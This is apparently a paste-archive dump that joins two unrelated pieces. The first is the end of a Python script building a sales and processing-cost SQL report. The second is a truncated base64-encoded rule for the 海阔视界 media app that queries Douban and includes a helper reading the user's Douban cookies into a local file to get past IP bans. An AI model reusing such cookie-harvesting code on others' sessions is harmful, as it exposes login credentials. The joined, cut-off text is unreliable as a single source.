        sale_line.id.as_('sale_line'),
        sale_line.unit_price.as_('sale_unit_price'),
        sale.party.as_('customer'),
        sale.shipment_party,
        template.default_uom.as_('uom'),
        sale_unit_load.id.as_('destination_unit_load'),
        sale_unit_load.product.as_('destination_product'),
        sale_unit_load.attribute_category.as_('destination_category'),
        sale_unit_load.attribute_caliber.as_('destination_caliber'),
        sale_unit_load.attribute_confection.as_('destination_confection'),
        destination_comb.product.as_('destination_base_product'),
        Case(
            (sale_unit_load.goods_receipt_line != Null, 'farm'),
            else_='warehouse').as_('destination_ul_type'),
        sale.sale_date,
        company.currency,
        currency.digits.as_('currency_digits'),
        uom.digits.as_('uom_digits'),
        invoice_query.invoice_date_min,
        Case(
            (unit_load.goods_receipt_line != Null,
                Round(Coalesce(base_query.received_quantity,
                        Coalesce(base_query.received_quantity,
                            unit_load.internal_quantity)
                        ).cast('numeric'), DIGITS)
            ), else_=Null).as_('received_quantity'),
        Round(
            Case((base_query.destination_unit_load != Null,
                Coalesce(base_query.destination_quantity, 0)),
                else_=0).cast('numeric'), DIGITS).as_('destination_quantity'),
        (sale_line.unit_price * Coalesce(
                base_query.destination_quantity, 0)).as_('sale_amount'),
        Case((
                (invoice.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0),
            Round((Coalesce(invoice.amount, 0) * (
                Coalesce(base_query.destination_quantity, 0)
                / windows['sale_quantity'])
            ).cast('decimal'), currency.digits)
            ),
            else_=Null).as_('invoice_amount'),
        Case(((
            (invoice.sale_line != Null)
            & (Coalesce(windows['sale_quantity'], 0) != 0)),
            Round((Coalesce(invoice.quantity, 0)
                * (Coalesce(base_query.destination_quantity, 0)
                    / windows['sale_quantity'])
                ).cast('numeric'), DIGITS)),
            else_=Null).as_('invoice_quantity'),
        Case((
            Coalesce(sale_unit_load.internal_quantity, 0) == 0, 0),
            else_=Round(
                Coalesce(sale_unit_load.cases_quantity, 0).cast('numeric') * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                    / sale_unit_load.internal_quantity.cast('numeric')
                ).cast('numeric'), DIGITS)
        ).as_('destination_cases_quantity'),
        Coalesce(Coalesce(Case((
                (invoice.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0),
                Round((Coalesce(invoice.amount, 0) * (
                    Coalesce(base_query.destination_quantity, 0)
                    / windows['sale_quantity'])
                ).cast('decimal'), currency.digits)
                ),
                else_=Null),
            (sale_line.unit_price * Coalesce(
                base_query.destination_quantity, 0))), 0
        ).as_('income_amount'),
        Case((
            Coalesce(sale_unit_load.internal_quantity, 0) == 0, 0),
            else_=-Round(
                (sale_unit_load.bom_amount * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                    / sale_unit_load.internal_quantity)).cast('decimal'),
                currency.digits)
        ).as_('bom_amount'),
        Case((
            (cost_entry.entry != Null) & (windows['entry_quantity'] != 0),
            -Round((
                Coalesce(cost_entry.amount, 0) * (
                    Coalesce(Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null), 0)
                    / windows['entry_quantity'])).cast('decimal'),
            currency.digits)), else_=Null).as_('entry_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_fixed_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_fixed_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_fixed_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_labor_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_labor_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_labor_cost_amount'),
            Case((
                Coalesce(sale_line.quantity, 0) != 0,
                -Round((Coalesce(
                    sale_cost_query.amount, 0) * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0
                            ).cast('numeric'), DIGITS) / sale_line.quantity)
                                ).cast('decimal'), currency.digits)),
                else_=0).as_('sale_cost_amount'),
            Case(((
                (sale_account_query.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0)),
                Round((Coalesce(sale_account_query.quantity, 0)
                    * (Coalesce(base_query.destination_quantity, 0)
                        / windows['sale_quantity'])
                ).cast('numeric'), DIGITS)),
                else_=Null).as_('sold_account_quantity'),
        where=(
            (receipt.company == 1)
            & (Coalesce(receipt.effective_date, from_date) > from_date))
    )

print(query)
print(query.params)
"
qmD0p666,邀您一起看：热辣滚烫,xiaomianao666,JavaScript,Tuesday 23rd of April 2024 09:37:20 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥热辣滚烫@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJqczpcXG5ldmFsKEpTT04ucGFyc2UocmVxdWVzdChcXFwiaGlrZXI6Ly9wYWdlL21haW5cXFwiKSkucnVsZSk7XFxubGV0IHR5cGUgPSBnZXRQYXJhbSgndHlwZScsICcnKSxcXG4gICAgaWQgPSBnZXRQYXJhbSgnaWQnLCAnJyksXFxuICAgIHRpdGxlID0gZ2V0UGFyYW0oJ3RpdGxlJywgJycpO1xcbmxldCByZXMgPSBnZXREb3ViYW5SZXMoXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcIiArIHR5cGUgKyBcXFwiL1xcXCIgKyBpZCk7XFxubGV0IHVwZGF0ZSA9IFxcXCJcXFwiO1xcbmlmICh0aXRsZSA9PSAnJykge1xcbiAgICBsZXQgbGVuZ3RoID0gcmVzLnZlbmRvcnMubGVuZ3RoO1xcbiAgICB1cGRhdGUgKz0gbGVuZ3RoID4gMCA/ICflhbEnICsgbGVuZ3RoICsgJ+S4queJh+a6kCcgOiAn5pqC5peg54mH5rqQJztcXG4gICAgaWYgKGxlbmd0aCA+IDApIHtcXG4gICAgICAgIGxldCBlID0gcmVzLnZlbmRvcnNbMF07XFxuICAgICAgICB1cGRhdGUgKz0gZS5lcGlzb2Rlc19pbmZvID8gXFxcInxcXFwiICsgZS5lcGlzb2Rlc19pbmZvIDogXFxcIlxcXCI7XFxuICAgIH1cXG59IGVsc2Uge1xcbiAgICBmb3IgKGxldCBlIG9mIHJlcy52ZW5kb3JzKSB7XFxuICAgICAgICBpZiAoZS50aXRsZSA9PSB0aXRsZSkge1xcbiAgICAgICAgICAgIHVwZGF0ZSArPSBlLmVwaXNvZGVzX2luZm8gPyBlLmVwaXNvZGVzX2luZm8gOiBcXFwiXFxcIjtcXG4gICAgICAgICAgICBicmVhaztcXG4gICAgICAgIH1cXG4gICAgfVxcbn1cXG5zZXRSZXN1bHQodXBkYXRlKTtcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIumFjee9rue8lui+keeVjOmdolwiLFwicGF0aFwiOlwic2V0dGluZy1lZGl0b3JcIixcInJ1bGVcIjpcImpzOlxcbi8qKlxcbiAqIOmAmui/h+S8oOWFpSBwYXJhbXMg5a+56LGh55Sf5oiQ57yW6L6R55WM6Z2iXFxuICogQHBhcmFtIGQg6KeG55WMIHNldFJlc3VsdCDnlKjnmoTliJfooahcXG4gKiBAcGFyYW0gY29uZmlnS2V5IGNvbmZpZyDnmoQga2V5IOWAvO+8jOavlOWmguaIkeimgeaLvyBjb25maWcuZGV0YWlsc1ZpZXdDb25maWdz77yMY29uZmlnS2V5IOWwseS8oCBcXFwiZGV0YWlsc1ZpZXdDb25maWdzXFxcIlxcbiAqIEBwYXJhbSBwYXJhbXMg57yW6L6R55WM6Z2i55qE6YWN572uXFxuICpcXG4gKiDjgJBwYXJhbXPlr7nosaHmlbDmja7npLrkvovjgJFcXG4gKiB7XFxuICAgICAgICBrZXk6IFxcXCJpbnB1dF9uYW1lXFxcIixcXG4gICAgICAgIGRlc2M6IFxcXCLor7fovpPlhaXlkI3np7BcXFwiLFxcbiAgICAgICAgdHlwZTogJ3RleHRhcmVhJyxcXG4gICAgICAgIGRhdGE6IHtcXG4gICAgICAgICAgICBjb25maWc6IHtcXG4gICAgICAgICAgICAgICAga2V5OiBcXFwiaW5wdXRfY29kZVxcXCIsXFxuICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLor7fovpPlhaXovpPlhaXphY3nva5cXFwiLFxcbiAgICAgICAgICAgICAgICB0eXBlOiAndGV4dGFyZWEnXFxuICAgICAgICAgICAgfSxcXG4gICAgICAgIH1cXG4gICAgfVxcbiAqL1xcbmZ1bmN0aW9uIG1vZGVFZGl0UGFnZShkLCBjb25maWdLZXksIHBhcmFtcykge1xcbiAgICBhZGRMaXN0ZW5lcignb25DbG9zZScsICQudG9TdHJpbmcoKHBhcmFtcykgPT4ge1xcbiAgICAgICAgY2xlYXJNeVZhcihwYXJhbXMua2V5KVxcbiAgICAgICAgbGV0IGRhdGFzID0gcGFyYW1zLmRhdGE7XFxuICAgICAgICBsZXQgZGF0YUtleXMgPSBPYmplY3Qua2V5cyhkYXRhcyk7XFxuICAgICAgICBmb3IgKGxldCBpIGluIGRhdGFLZXlzKSB7XFxuICAgICAgICAgICAgbGV0IGRhdGFLZXkgPSBkYXRhS2V5c1tpXVxcbiAgICAgICAgICAgIGNsZWFyTXlWYXIoZGF0YXNbZGF0YUtleV0ua2V5KVxcbiAgICAgICAgfVxcbiAgICB9LCBwYXJhbXMpKVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCLkv53lrZhcXFwiLFxcbiAgICAgICAgZGVzYzogcGFyYW1zLmRlc2MsXFxuICAgICAgICBjb2xfdHlwZTogJ2lucHV0JyxcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZSxcXG4gICAgICAgICAgICBkZWZhdWx0VmFsdWU6IGdldE15VmFyKHBhcmFtcy5rZXksIFxcXCJcXFwiKSxcXG4gICAgICAgICAgICB0eXBlOiBwYXJhbXMudHlwZSA/IHBhcmFtcy50eXBlIDogJycsXFxuICAgICAgICAgICAgb25DaGFuZ2U6ICdwdXRNeVZhcihcXFwiJyArIHBhcmFtcy5rZXkgKyAnXFxcIiwgaW5wdXQpJ1xcbiAgICAgICAgfVxcbiAgICB9KVxcbiAgICBsZXQgZGF0YXMgPSBwYXJhbXMuZGF0YTtcXG4gICAgbGV0IGRhdGFLZXlzID0gT2JqZWN0LmtleXMoZGF0YXMpO1xcbiAgICBmb3IgKGxldCBkYXRhS2V5IG9mIGRhdGFLZXlzKSB7XFxuICAgICAgICBsZXQgZGF0YSA9IGRhdGFzW2RhdGFLZXldXFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi5L+d5a2YXFxcIixcXG4gICAgICAgICAgICBkZXNjOiBkYXRhLmRlc2MsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdpbnB1dCcsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZSxcXG4gICAgICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBnZXRNeVZhcihkYXRhLmtleSwgXFxcIlxcXCIpLFxcbiAgICAgICAgICAgICAgICB0eXBlOiBkYXRhLnR5cGUgPyBkYXRhLnR5cGUgOiAnJyxcXG4gICAgICAgICAgICAgICAgaGVpZ2h0OiA1LFxcbiAgICAgICAgICAgICAgICBoaWdobGlnaHQ6IHRydWUsXFxuICAgICAgICAgICAgICAgIG9uQ2hhbmdlOiAncHV0TXlWYXIoXFxcIicgKyBkYXRhLmtleSArICdcXFwiLCBpbnB1dCknXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSlcXG4gICAgfVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfkv53lrZgnLFxcbiAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXG4gICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGNvbmZpZ0tleSwgcGFyYW1zKSA9PiB7XFxuICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSlcXG4gICAgICAgICAgICBsZXQgbmFtZSA9IGdldE15VmFyKHBhcmFtcy5rZXksIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICBpZihuYW1lID09ICfpu5jorqQnKSByZXR1cm4gJ3RvYXN0Oi8v6buY6K6k6YWN572u5peg5rOV57yW6L6RJ1xcbiAgICAgICAgICAgIGNvbmZpZ1tjb25maWdLZXldLnVzZSA9IG5hbWVcXG4gICAgICAgICAgICBpZiAoIWNvbmZpZ1tjb25maWdLZXldW25hbWVdKSBjb25maWdbY29uZmlnS2V5XVtuYW1lXSA9IHt9XFxuICAgICAgICAgICAgbGV0IGRhdGFzID0gcGFyYW1zLmRhdGE7XFxuICAgICAgICAgICAgbGV0IGRhdGFLZXlzID0gT2JqZWN0LmtleXMoZGF0YXMpO1xcbiAgICAgICAgICAgIGZvciAobGV0IGkgaW4gZGF0YUtleXMpIHtcXG4gICAgICAgICAgICAgICAgbGV0IGRhdGFLZXkgPSBkYXRhS2V5c1tpXVxcbiAgICAgICAgICAgICAgICBsZXQgZGF0YSA9IGRhdGFzW2RhdGFLZXldXFxuICAgICAgICAgICAgICAgIGNvbmZpZ1tjb25maWdLZXldW25hbWVdW2RhdGFLZXldID0gZ2V0TXlWYXIoZGF0YS5rZXksIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgd3JpdGVGaWxlKGdldE15VmFyKCdxZGJfY29uZmlnJyksIEpTT04uc3RyaW5naWZ5KGNvbmZpZykpXFxuICAgICAgICAgICAgYmFjaygpO1xcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/kv53lrZjmiJDlip8nXFxuICAgICAgICB9LCBjb25maWdLZXksIHBhcmFtcylcXG4gICAgfSlcXG59XFxuXFxuLy/oh6rlrprkuYnpppbpobUt6YWN572u57yW6L6R6aG16Z2iXFxuZnVuY3Rpb24gaG9tZVBhZ2VNb2RlRWRpdFBhZ2UoZCkge1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICc8Zm9udCBjb2xvcj1cXFwicmVkXFxcIj4nICsgJ+i/lOWbnuaVsOe7hCzkvptzZXRSZXN1bHTkvb/nlKgnICsgJzwvZm9udD4nICsgJzxmb250IGNvbG9yPVxcXCIjODA4MDgwXFxcIj48YnI+JyArICfjgJDlhoXnva7lh73mlbDjgJEnICsgJzxicj4mbmJzcDsmbmJzcDsmbmJzcDtoaWtlcjovL3BhZ2Uvc2V0dGluZ1BhZ2U6IOiuvue9rumhtSjpu5jorqTpppbpobXmnInkvb/nlKjnpLrkvospJyArICc8L2ZvbnQ+JyxcXG4gICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcbiAgICB9KVxcbiAgICBtb2RlRWRpdFBhZ2UoZCwgXFxcImhvbWVQYWdlQ29uZmlnc1xcXCIsIHtcXG4gICAgICAgIGtleTogXFxcImlucHV0X25hbWVcXFwiLFxcbiAgICAgICAgZGVzYzogXFxcIuivt+i+k+WFpeWQjeensFxcXCIsXFxuICAgICAgICAvLyB0eXBlOiAnaW5wdXQnXFxuICAgICAgICBkYXRhOiB7XFxuICAgICAgICAgICAgY29uZmlnOiB7XFxuICAgICAgICAgICAgICAgIGtleTogXFxcImlucHV0X2NvZGVcXFwiLFxcbiAgICAgICAgICAgICAgICBkZXNjOiBcXFwi6K+36L6T5YWl6YWN572u5Luj56CBXFxcIixcXG4gICAgICAgICAgICAgICAgdHlwZTogJ3RleHRhcmVhJ1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgfSlcXG59XFxuXFxuLy/oh6rlrprkuYnor6bmg4XpobXpnaIt6YWN572u57yW6L6R6aG16Z2iXFxuZnVuY3Rpb24gZGV0YWlsVmlld01vZGVFZGl0UGFnZShkKSB7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJzxmb250IGNvbG9yPVxcXCIjODA4MDgwXFxcIj4nICsgJ+OAkOWGhee9ruWPmOmHj+OAkScgKyAnPGJyPiZuYnNwOyZuYnNwOyZuYnNwO2lkOiDniYfljZVpZCcgKyAnPGJyPiZuYnNwOyZuYnNwOyZuYnNwO3R5cGU6IOeJh+WNleexu+WeiycgKyAnPGJyPiZuYnNwOyZuYnNwOyZuYnNwO3RpdGxlOiDniYfljZXmoIfpopgnICsgJzwvZm9udD4nLFxcbiAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxuICAgIH0pXFxuICAgIG1vZGVFZGl0UGFnZShkLCBcXFwiZGV0YWlsc1ZpZXdDb25maWdzXFxcIiwge1xcbiAgICAgICAga2V5OiBcXFwiaW5wdXRfbmFtZVxcXCIsXFxuICAgICAgICBkZXNjOiBcXFwi6K+36L6T5YWl5ZCN56ewXFxcIixcXG4gICAgICAgIC8vIHR5cGU6ICdpbnB1dCdcXG4gICAgICAgIGRhdGE6IHtcXG4gICAgICAgICAgICBjb25maWc6IHtcXG4gICAgICAgICAgICAgICAga2V5OiBcXFwiaW5wdXRfY29kZVxcXCIsXFxuICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLor7fovpPlhaXphY3nva7ku6PnoIFcXFwiLFxcbiAgICAgICAgICAgICAgICB0eXBlOiAndGV4dGFyZWEnXFxuICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICBzZXR0aW5nOiB7XFxuICAgICAgICAgICAgICAgIGtleTogXFxcImlucHV0X3NldHRpbmdfY29kZVxcXCIsXFxuICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLor7fovpPlhaXorr7nva7pobXpnaLku6PnoIFcXFwiLFxcbiAgICAgICAgICAgICAgICB0eXBlOiAndGV4dGFyZWEnXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICB9KVxcbn1cXG5cXG4vL+iHquWumuS5ieino+aekC3nvJbovpHpobXpnaJcXG5mdW5jdGlvbiBhbmFseXNpc01vZGVFZGl0UGFnZShkKSB7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJzxmb250IGNvbG9yPVxcXCIjODA4MDgwXFxcIj4nICsgJ+OAkOino+aekOS7o+eggeWGhee9ruWPmOmHj+OAkScgKyAnPGJyPiZuYnNwOyZuYnNwOyZuYnNwO2lucHV0OiDop4bpopHpk77mjqUnICsgJzwvZm9udD4nLFxcbiAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxuICAgIH0pXFxuICAgIG1vZGVFZGl0UGFnZShkLCBcXFwiYW5hbHlzaXNDb25maWdzXFxcIiwge1xcbiAgICAgICAga2V5OiBcXFwiaW5wdXRfbmFtZVxcXCIsXFxuICAgICAgICBkZXNjOiBcXFwi6K+36L6T5YWl5ZCN56ewXFxcIixcXG4gICAgICAgIC8vIHR5cGU6ICdpbnB1dCdcXG4gICAgICAgIGRhdGE6IHtcXG4gICAgICAgICAgICBjb25maWc6IHtcXG4gICAgICAgICAgICAgICAga2V5OiBcXFwiaW5wdXRfY29kZVxcXCIsXFxuICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLor7fovpPlhaXop6PmnpDku6PnoIFcXFwiLFxcbiAgICAgICAgICAgICAgICB0eXBlOiAndGV4dGFyZWEnXFxuICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBrZXk6ICdpbnB1dF9leHRyYScsXFxuICAgICAgICAgICAgICAgIGRlc2M6ICfor7fovpPlhaVleHRyYeWxnuaAp+WAvCcsXFxuICAgICAgICAgICAgICAgIHR5cGU6ICd0ZXh0YXJlYSdcXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICAgIHNldHRpbmc6IHtcXG4gICAgICAgICAgICAgICAga2V5OiBcXFwiaW5wdXRfc2V0dGluZ19jb2RlXFxcIixcXG4gICAgICAgICAgICAgICAgZGVzYzogXFxcIuivt+i+k+WFpeiuvue9rumhtemdouS7o+eggVxcXCIsXFxuICAgICAgICAgICAgICAgIHR5cGU6ICd0ZXh0YXJlYSdcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgIH0pXFxufVxcblxcbmxldCBkID0gW107XFxubGV0IHZpZXcgPSBnZXRQYXJhbShcXFwidmlld1xcXCIsXFxcIlxcXCIpO1xcbmlmKHZpZXc9PVxcXCJhbmFseXNpc01vZGVFZGl0UGFnZVxcXCIpe1xcbiAgICBzZXRQYWdlVGl0bGUoXFxcIuiHquWumuS5ieino+aekOe8lui+kVxcXCIpXFxuICAgIGFuYWx5c2lzTW9kZUVkaXRQYWdlKGQpO1xcbn1lbHNlIGlmKHZpZXc9PVxcXCJkZXRhaWxWaWV3TW9kZUVkaXRQYWdlXFxcIil7XFxuICAgIHNldFBhZ2VUaXRsZShcXFwi6Ieq5a6a5LmJ6K+m5oOF6aG157yW6L6RXFxcIilcXG4gICAgZGV0YWlsVmlld01vZGVFZGl0UGFnZShkKTtcXG59ZWxzZSBpZih2aWV3PT1cXFwiaG9tZVBhZ2VNb2RlRWRpdFBhZ2VcXFwiKXtcXG4gICAgc2V0UGFnZVRpdGxlKFxcXCLoh6rlrprkuYnpppbpobXnvJbovpFcXFwiKVxcbiAgICBob21lUGFnZU1vZGVFZGl0UGFnZShkKTtcXG59XFxuc2V0UmVzdWx0KGQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6Kej6Zmk6KKr5bCBaXBcIixcInBhdGhcIjpcInJlbGVhc2VJUFwiLFwicnVsZVwiOlwianM6XFxubGV0IGlkID0gZ2V0UGFyYW0oJ2lkJyk7XFxubGV0IGQgPSBbXTtcXG5kLnB1c2goe1xcbiAgICB0aXRsZTogJ+aCqOW3suiiq+WwgeemgUlQ5Zyw5Z2A5oiW6Kem5Y+R5LqG5Lq65py66aqM6K+B77yM6K+35oyJ54Wn5Lul5LiL5q2l6aqk5aSE55CGKOWmguS4jeWkhOeQhuaCqOWwhuWcqOS4gOauteaXtumXtOWGheaXoOazleato+W4uOiOt+WPluWJp+mbhuWIl+ihqCknLFxcbiAgICB1cmw6ICdoaWtlcjovL2VtcHR5JyxcXG4gICAgY29sX3R5cGU6ICd0ZXh0XzEnXFxufSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6ICcxLueCueWHu+atpOWkhOWvvOWFpeiHquWKqOiOt+WPlkNvb2tpZeaPkuS7ticsXFxuICAgIHVybDogJCgpXFxuICAgICAgICAubGF6eVJ1bGUoKCkgPT4ge1xcbiAgICAgICAgICAgIGxldCBnZXREb3ViYW5Db29raWUgPSBcXFwiKGZ1bmN0aW9uKCl7aWYod2luZG93Wydsb2NhdGlvbiddWydob3N0J109PSd3d3cuZG91YmFuLmNvbScpe2Z5X2JyaWRnZV9hcHBbJ3dyaXRlRmlsZSddKCdoaWtlcjovL2ZpbGVzL2NhY2hlL2RvdWJhbmNvb2tpZS50eHQnLGZ5X2JyaWRnZV9hcHBbJ2dldENvb2tpZSddKCdodHRwczovL3d3dy5kb3ViYW4uY29tLycpKTt9aWYod2luZG93Wydsb2NhdGlvbiddWydob3N0J109PSdtLmRvdWJhbi5jb20nKXtmeV9icmlkZ2VfYXBwWyd3cml0ZUZpbGUnXSgnaGlrZXI6Ly9maWxlcy9jYWNoZS9kb3ViYW5jb29raWUudHh0JyxmeV9icmlkZ2VfYXBwWydnZXRDb29raWUnXSgnaHR0cHM6Ly9tLmRvdWJhbi5jb20vJykpO319KCkpO1xcXCJcXG4gICAgICAgICAgICBpZiAoIWZpbGVFeGlzdCgnaGlrZXI6Ly9maWxlcy9jYWNoZS9nbG9iYWxfZ2V0RG91YmFuQ29va2llLmpzJykpIHtcXG4gICAgICAgICAgICAgICAgd3JpdGVGaWxlKCdoaWtlcjovL2ZpbGVzL2NhY2hlL2dsb2JhbF9nZXREb3ViYW5Db29raWUuanMnLCBnZXREb3ViYW5Db29raWUpO1xcbiAgICAgICAgICAgIH07XFxuICAgICAgICAgICAgcmV0dXJuICdydWxlOi8vJyArIGJhc2U2NEVuY29kZSgn5rW36ZiU6KeG55WM77yM572R6aG15o+S5Lu277+lanNfdXJs77+lZ2xvYmFsX2dldERvdWJhbkNvb2tpZUBoaWtlcjovL2ZpbGVzL2NhY2hlL2dsb2JhbF9nZXREb3ViYW5Db29raWUuanMnKTtcXG4gICAgICAgIH0pLFxcbiAgICBjb2xfdHlwZTogJ3RleHRfMSdcXG59KTtcXG5kLnB1c2goe1xcbiAgICB0aXRsZTogJzIu54K55Ye75q2k5aSE6L+b5YWl572R6aG16L+b6KGM55m75b2V5oiW5Lq65py66aqM6K+B77yM5a6M5oiQ5ZCO6L+U5Zue5q2k6aG16Z2iJyxcXG4gICAgdXJsOiAnaHR0cHM6Ly9tb3ZpZS5kb3ViYW4uY29tL3N1YmplY3QvJyArIGlkICsgJy8nLFxcbiAgICBjb2xfdHlwZTogJ3RleHRfMSdcXG59KTtcXG5kLnB1c2goe1xcbiAgICB0aXRsZTogJzMu5a6M5oiQ55m75b2V5oiW5Lq65py66aqM6K+B5ZCO6L+U5Zue5b2x54mH6K+m5oOF6aG16Z2i6YeN5paw6L+b5YWlJyxcXG4gICAgdXJsOiAnaGlrZXI6Ly9lbXB0eScsXFxuICAgIGNvbF90eXBlOiAndGV4dF8xJ1xcbn0pO1xcbnNldFJlc3VsdChkKVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5oqi5pWR6aG16Z2iXCIsXCJwYXRoXCI6XCJ1cmdlbmN5TW9kZVwiLFwicnVsZVwiOlwianM6XFxubGV0IGQgPSBbXTtcXG5cXG5kLnB1c2goe1xcbiAgdGl0bGU6ICflvojmmI7mmL4s5Ye65LqG5LiA5Lqb5bCP6Zeu6aKYLOW7uuiuruafpeeci+iuvue9ricsXFxuICBkZXNjOiBcXFwi5Ye66ZSZ5L2N572uOlxcXCIgKyAodHlwZW9mKHBvcykgPT0gJ3VuZGVmaW5lZCcgPyAn5pyq55+lJyA6IHBvcyksXFxuICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcbiAgdXJsOiAnaGlrZXI6Ly9lbXB0eScsXFxufSk7XFxuXFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6ICfngrnmiJHov5vlhaXorr7nva7pobUnLFxcbiAgICBjb2xfdHlwZTogJ3RleHRfMScsXFxuICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9zZXR0aW5nUGFnZVxcXCJcXG59KVxcblxcbmQucHVzaCh7XFxuICB0a